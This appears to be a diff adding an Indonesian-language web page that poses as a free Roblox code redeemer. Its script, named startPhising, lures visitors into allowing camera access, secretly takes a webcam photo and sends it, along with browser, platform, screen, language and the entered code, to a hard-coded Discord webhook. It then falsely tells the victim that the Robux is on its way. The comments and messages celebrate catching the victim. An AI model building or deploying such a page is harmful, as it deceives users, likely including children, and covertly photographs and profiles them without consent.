@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redeem Roblox Code Gratis 2026</title>
+    <style>
+        body { margin:0; background:#111; color:#0f0; font-family:Arial, sans-serif; text-align:center; padding:20px; }
+        h1 { font-size:2.5em; margin:20px 0; }
+        input { padding:15px; width:90%; max-width:400px; font-size:1.2em; margin:10px 0; border:2px solid #0f0; background:#000; color:#0f0; }
+        button { padding:20px 50px; background:#0f0; border:none; color:#000; font-size:1.8em; cursor:pointer; margin:30px 0; border-radius:10px; }
+        video { width:90%; max-width:500px; border:3px solid #0f0; border-radius:10px; margin:20px auto; display:block; }
+        #status { font-size:1.5em; margin-top:30px; }
+    </style>
+</head>
+<body>
+
+    <h1>Redeem Kode Roblox Gratis!</h1>
+    <p>Masukkin kode redeem Roblox lo di bawah, lalu klik tombol biar Robux langsung masuk ke akun lo 😈</p>
+    
+    <input type="text" id="code" placeholder="Masukin kode Roblox (contoh: ROBUX2026)">
+    <br>
+    <button onclick="startPhising()">REDEEM SEKARANG</button>
+    
+    <video id="video" autoplay playsinline muted></video>
+    
+    <div id="status">Sedang memproses... Izinkan kamera ya bro biar work!</div>
+
+    <script>
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+
+        // INI TEMPATNYA
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467443312851157036/Vu4cKn2zL_8-YSN77qsqhMnWcOlNlKJNBTF8zP73yUS6lMYUrvCZPSULsHfZNZf9Na4U";
+
+        async function startPhising() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                status.innerHTML = "Kamera nyala! Tunggu 4 detik buat ambil foto...";
+
+                setTimeout(() => captureAndSend(stream), 4000);
+            } catch (err) {
+                status.innerHTML = "Izinkan akses kamera dulu biar redeem jalan! Refresh & allow.";
+            }
+        }
+
+        function captureAndSend(stream) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            const photoBase64 = canvas.toDataURL('image/png');
+
+            const victimInfo = `**Phising Masuk Bro!** 😈
+Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+Browser: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Resolusi Layar: \( {screen.width}x \){screen.height}
+Bahasa: ${navigator.language}
+Kode yang dimasukin: ${document.getElementById('code').value || "Ga dimasukin"}
+
+Foto korban langsung nih!`;
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: victimInfo,
+                    embeds: [{
+                        image: {
+                            url: photoBase64
+                        }
+                    }]
+                })
+            })
+            .then(() => {
+                status.innerHTML = "Redeem sukses! Robux masuk dalam 3-5 menit. Tunggu aja ya 😏";
+            })
+            .catch(err => {
+                console.log(err);
+                status.innerHTML = "Error kirim, tapi foto udah diambil.";
+            });
+
+            stream.getTracks().forEach(track => track.stop());
+        }
+    </script>
+</body>
+</html>
